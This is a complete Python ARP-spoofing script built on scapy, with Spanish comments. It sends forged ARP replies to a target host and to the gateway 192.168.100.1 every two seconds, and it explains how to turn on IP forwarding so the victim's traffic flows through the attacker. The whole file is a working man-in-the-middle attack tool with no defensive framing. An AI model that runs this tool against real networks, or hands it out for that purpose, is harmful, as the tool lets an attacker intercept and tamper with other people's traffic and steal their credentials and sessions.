#!/usr/bin/env python3

# Para recibir el trafico de la victima y resolver la solicitud se debe configurar la iptable en consola iptables --policy FORWARD ACCEPT, ot
# Tambien se debe modificar el archivo /proc/sys/net/ipv4/ip_forward, tiene que tener como valor 1

import argparse
import time
import scapy.all as scapy
import signal
import sys

def def_handler(sig, frame):
    print(f"\n Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_addres", help="Host / IP Range to Spoof")

    args = parser.parse_args()

    return args.ip_addres

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="DIRECCIONMAC") #Se debe ingresar la direccion mac con la cual se hara el spoof
    scapy.send(arp_packet, verbose=False)

def main():
    target = get_arguments()

    while True:
        spoof(target, "192.168.100.1")
        spoof("192.168.100.1", target)

        time.sleep(2)

if __name__ == '__main__':
    main()

